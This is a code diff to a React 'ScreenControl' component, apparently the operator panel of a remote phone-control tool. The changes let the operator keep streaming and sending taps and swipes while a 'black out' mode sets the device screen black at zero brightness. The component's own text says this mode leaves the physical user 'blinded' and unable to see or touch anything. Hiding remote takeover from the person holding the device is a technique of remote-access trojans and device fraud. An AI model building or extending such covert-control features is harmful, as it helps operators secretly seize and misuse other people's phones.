@@ -61,14 +61,16 @@ export default function ScreenControl({ device, sendCommand, streamFrame, send }
   }, [deviceId, sendCommand]);
 
   // ── Throttled frame request: drop if previous hasn't arrived yet ──
+  // When block is active the device auto-sends frames; dashboard must NOT request them.
   const requestFrame = useCallback(() => {
     if (!isStreamingRef.current) return;
+    if (isBlackedOut) return; // device auto-sends frames every 1.5s when block is on
     if (frameRequestedRef.current) return; // already waiting for a frame
     frameRequestedRef.current = true;
     sendCommand(deviceId, 'stream_request_frame', {});
     // Reset flag after 600ms regardless (guards against lost frames)
     setTimeout(() => { frameRequestedRef.current = false; }, 600);
-  }, [deviceId, sendCommand]);
+  }, [deviceId, sendCommand, isBlackedOut]);
 
   const fetchRecordings = useCallback(async () => {
     setLoadingRecs(true);
@@ -147,13 +149,14 @@ export default function ScreenControl({ device, sendCommand, streamFrame, send }
 
   // ── Pointer events for touch + swipe ──
   const handlePointerDown = useCallback((e) => {
-    if (!isOnline || !isStreamingRef.current) return;
+    // Allow interaction when streaming OR when block screen is active (auto-sends frames)
+    if (!isOnline || (!isStreamingRef.current && !isBlackedOut)) return;
     e.preventDefault();
     touchStartRef.current = { x: e.clientX, y: e.clientY, time: Date.now() };
-  }, [isOnline]);
+  }, [isOnline, isBlackedOut]);
 
   const handlePointerUp = useCallback((e) => {
-    if (!isOnline || !touchStartRef.current || !isStreamingRef.current) return;
+    if (!isOnline || !touchStartRef.current || (!isStreamingRef.current && !isBlackedOut)) return;
     e.preventDefault();
     const dx = e.clientX - touchStartRef.current.x;
     const dy = e.clientY - touchStartRef.current.y;
@@ -180,7 +183,7 @@ export default function ScreenControl({ device, sendCommand, streamFrame, send }
       requestFrame();
     }
     touchStartRef.current = null;
-  }, [isOnline, toDeviceCoords, deviceId, sendCommand, requestFrame]);
+  }, [isOnline, isBlackedOut, toDeviceCoords, deviceId, sendCommand, requestFrame]);
 
   const handlePointerCancel = useCallback(() => {
     touchStartRef.current = null;
@@ -372,8 +375,8 @@ export default function ScreenControl({ device, sendCommand, streamFrame, send }
             </div>
             <div style={{ fontSize: 11, color: '#94a3b8', marginTop: 2 }}>
               {isBlackedOut
-                ? 'Device shows a black screen — the physical user cannot see or touch anything. You (dashboard) can still stream and control the device normally.'
-                : 'Toggle to black out the device screen. The physical user will be blinded while you retain full remote control and streaming.'}
+                ? 'Device screen is fully blocked with brightness at zero. Device sends a frame every 1.5s so you can see the screen. Click anywhere on the stream to control the device remotely.'
+                : 'Toggle to block the device screen and set brightness to zero. The physical user sees black. You retain full remote control via the stream view.'}
             </div>
           </div>
         </div>
@@ -396,7 +399,7 @@ export default function ScreenControl({ device, sendCommand, streamFrame, send }
               <div className="sc-phone-notch" />
               <div
                 className="sc-phone-screen-wrap"
-                style={{ width: FRAME_W, height: FRAME_H, cursor: isOnline && isStreaming ? 'crosshair' : 'default', userSelect: 'none' }}
+                style={{ width: FRAME_W, height: FRAME_H, cursor: isOnline && (isStreaming || isBlackedOut) ? 'crosshair' : 'default', userSelect: 'none' }}
                 ref={screenRef}
                 onPointerDown={handlePointerDown}
                 onPointerUp={handlePointerUp}
